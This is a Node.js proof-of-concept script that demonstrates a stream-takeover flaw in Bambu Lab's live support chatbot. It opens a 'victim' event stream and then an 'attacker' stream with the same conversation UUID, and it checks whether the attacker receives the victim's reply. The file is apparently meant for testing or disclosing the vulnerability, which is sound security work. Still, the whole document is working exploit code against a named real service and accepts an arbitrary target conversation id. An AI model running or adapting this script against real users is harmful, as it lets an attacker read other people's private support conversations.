// Minimal one-trial stream-takeover proof.
// Opens a victim stream, then an attacker stream with the same uuid,
// sends one chat, and exits as soon as the marker appears.
//
// Run: node takeover-only.js
// Optional: $env:TAKEOVER_UUID="<uuid>"; $env:REGION="CN"

const crypto = require('crypto');
const { ProxyAgent, fetch } = require('undici');

const BASE = process.env.BAMBU_BASE || 'https://support.bambulab.com';
const REGION = (process.env.REGION || 'EN').toUpperCase();
const UUID = process.env.TAKEOVER_UUID || crypto.randomUUID();
const MARKER = 'TAKEOVER-' + crypto.randomUUID().slice(0, 8);
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function headers(uuid) {
  return {
    'content-type': 'application/json',
    origin: BASE,
    referer: BASE + '/liveChat',
    'user-agent': UA,
    'x-robot-user': uuid,
    'x-bbl-official-site-region': REGION,
  };
}

function openStream(label) {
  const ctl = new AbortController();
  let out = '';
  let buf = '';
  const ready = fetch(BASE + '/gw/robot/sse/connect', {
    headers: {
      ...headers(UUID),
      accept: 'text/event-stream',
      'cache-control': 'no-cache',
      pragma: 'no-cache',
      'x-accel-buffering': 'no',
    },
    dispatcher,
    signal: ctl.signal,
  }).then((res) => {
    if (!res.ok) throw new Error('SSE ' + res.status);
    const reader = res.body.getReader();
    const dec = new TextDecoder();
    (async () => {
      try {
        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          if (!value) continue;
          buf += dec.decode(value, { stream: true });
          const parts = buf.split(/\r?\n\r?\n/);
          buf = parts.pop();
          for (const part of parts) {
            for (const line of part.split(/\r?\n|\r/)) {
              if (!line.startsWith('data:')) continue;
              const x = line.slice(5).replace(/^ /, '');
              if (x === '[DONE]') return;
              try {
                const j = JSON.parse(x);
                if (j.delta) out += String(j.delta).replace(/<br\s*\/?>/gi, '\n');
              } catch {}
            }
          }
        }
      } catch {}
    })();
  }).catch((e) => {
    console.log(label, 'stream error:', e.message);
  });
  return { label, ready, ctl, get output() { return out; } };
}

async function send() {
  const body = {
    requestId: 'clientID_text_' + crypto.randomUUID(),
    history: [],
    chatbot: [],
    origin: 1,
    cacheFlag: false,
    input: `Reply with exactly ${MARKER}.`,
    machineModel: '',
    sessionId: UUID,
    uuid: UUID,
  };
  try {
    const res = await fetch(BASE + '/gw/robot/sse/chat', {
      method: 'POST',
      headers: headers(UUID),
      body: JSON.stringify(body),
      dispatcher,
      signal: AbortSignal.timeout(30000),
    });
    return { status: res.status, text: (await res.text()).slice(0, 160) };
  } catch (e) {
    return { error: e.name + ': ' + e.message };
  }
}

(async () => {
  const shortId = UUID.slice(0, 8) + '...' + UUID.slice(-4);
  console.log('Stream takeover test');
  console.log('====================');
  console.log('Scenario: the victim has a chat stream open. The attacker opens a second');
  console.log('stream with the same conversation id. Then the victim sends a message.');
  console.log('');
  console.log('Conversation id: ' + shortId);
  console.log('Test message:    Reply with exactly ' + MARKER);
  console.log('');

  const victim = openStream('victim');
  await victim.ready;
  await sleep(250);
  const attacker = openStream('attacker');
  await attacker.ready;
  await sleep(250);
  console.log('Streams: victim and attacker connected');

  const sent = await send();
  console.log('Chat request: ' + (sent.status ? 'HTTP ' + sent.status : sent.error));

  const deadline = Date.now() + 35000;
  while (Date.now() < deadline) {
    if (attacker.output.includes(MARKER) || victim.output.includes(MARKER)) break;
    await sleep(250);
  }

  const victimGot = victim.output.includes(MARKER);
  const attackerGot = attacker.output.includes(MARKER);

  console.log('Result');
  console.log('------');
  console.log('Victim stream:   ' + (victimGot ? 'received the answer' : 'no answer (empty)'));
  console.log('Attacker stream: ' + (attackerGot ? 'received the answer' : 'no answer (empty)'));
  console.log('');
  if (attackerGot && !victimGot) {
    console.log('=> The attacker stream received the victim\'s answer.');
    console.log('   The victim\'s stream got nothing.');
  } else {
    console.log('=> Marker not observed in the expected stream.');
  }
  console.log('');
  console.log('Attacker output: ' + JSON.stringify(attacker.output.trim().slice(0, 120)));
  console.log('Victim output:   ' + JSON.stringify(victim.output.trim().slice(0, 120)));
  if (!attackerGot && !victimGot) {
    console.log('');
    console.log('No marker received. The chat request status is shown above.');
  }

  victim.ctl.abort();
  attacker.ctl.abort();
  process.exit(0);
})();